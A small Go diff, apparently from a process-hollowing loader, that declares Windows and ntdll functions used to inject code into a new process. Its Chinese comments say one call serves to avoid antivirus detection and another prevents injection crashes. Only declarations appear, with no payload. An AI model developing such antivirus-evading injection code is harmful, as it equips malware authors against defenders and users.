@@ -11,13 +11,14 @@ var (
 	ntdll                         = syscall.NewLazyDLL("ntdll.dll")
 	procCreateProcessW            = kernel32.NewProc("CreateProcessW")
 	procVirtualAllocEx            = kernel32.NewProc("VirtualAllocEx")
-	procVirtualProtectEx          = kernel32.NewProc("VirtualProtectEx") // 🌟 新增：用于后期内存权限降权，避免被杀软秒杀
+	procVirtualProtectEx          = kernel32.NewProc("VirtualProtectEx") // 🌟 用于后期内存权限降权，避免被杀软秒杀
 	procWriteProcessMemory        = kernel32.NewProc("WriteProcessMemory")
 	procReadProcessMemory         = kernel32.NewProc("ReadProcessMemory")
 	procGetThreadContext          = kernel32.NewProc("GetThreadContext")
 	procSetThreadContext          = kernel32.NewProc("SetThreadContext")
 	procResumeThread              = kernel32.NewProc("ResumeThread")
 	procWaitForSingleObject       = kernel32.NewProc("WaitForSingleObject")
+	procFlushInstructionCache     = kernel32.NewProc("FlushInstructionCache") // 🌟 新增：刷新 CPU 指令缓存，防止 D-Cache 和 I-Cache 不一致导致 Crash
 	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
 	procNtUnmapViewOfSection      = ntdll.NewProc("NtUnmapViewOfSection")
 )
